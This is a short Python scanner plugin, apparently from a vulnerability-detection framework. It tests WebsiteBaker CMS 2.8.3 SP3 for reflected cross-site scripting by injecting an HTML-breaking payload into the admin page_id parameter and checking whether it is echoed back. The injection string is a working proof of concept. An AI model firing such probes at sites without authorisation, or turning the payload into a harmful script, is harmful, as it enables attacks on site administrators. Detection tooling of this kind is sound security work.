# !/usr/bin/dev python
# coding = utf-8
import re

"""
reference:'http://packetstormsecurity.com/files/130008/CMS-Websitebaker-2.8.3-SP3-Cross-Site-Scripting.html'
"""


def assign(service, arg):
    if service == 'websiterbaker':
        return True, arg


def audit(arg):
    url = arg
    payload = '/admin/pages/modify.php?page_id=1%22><h1>xss%20here</h1><!--'
    url += payload
    code, head, res, errcode, final_url = curl.curl(url)
    #print "[*]Request URL: " + url
    if code == 200 and re.search("<h1>xss here</h1>", res):
        security_hole(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('websiterbaker', 'http://www.example.com/')[1])